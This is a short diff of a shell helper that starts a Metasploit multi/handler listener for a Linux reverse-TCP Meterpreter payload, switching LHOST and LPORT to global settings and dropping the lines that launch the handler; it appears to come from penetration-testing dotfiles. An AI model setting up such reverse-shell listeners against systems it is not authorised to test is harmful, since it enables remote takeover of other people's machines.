@@ -22,10 +22,8 @@ __meterpreter_handler_helper() {
     msfconsole -x "
         use exploit/multi/handler;
         set PAYLOAD $PAYLOAD;
-        set LHOST $LHOST;
-        set LPORT $LPORT;
-        set ExitOnSession false;
-        exploit -j;
+        setg LHOST $LHOST;
+        setg LPORT $LPORT;
     "
 }
 alias meterpreter_handler_linux='__meterpreter_handler_helper linux/x86/meterpreter/reverse_tcp meterpreter_linux'
